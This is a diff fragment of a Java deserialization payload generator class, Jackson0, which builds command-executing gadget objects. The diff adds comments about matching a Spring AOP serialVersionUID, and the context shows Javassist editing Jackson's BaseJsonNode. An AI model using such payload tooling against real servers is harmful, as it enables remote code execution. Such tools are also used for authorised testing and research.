@@ -30,6 +30,9 @@ public class Jackson0 implements CommandObjectPayload<Object>
     }
 
     public Object getObject(final String command) throws Exception {
+        // aop 6 local class serialVersionUID = 273003553246259276
+//        CtClassUtils.changeSerialVersionUID("org.springframework.aop.framework.DefaultAdvisorChainFactory", 273003553246259276L);
+
         CtClass ctClass = ClassPool.getDefault().get("com.fasterxml.jackson.databind.node.BaseJsonNode");
         try {
             CtMethod writeReplace = ctClass.getDeclaredMethod("writeReplace");
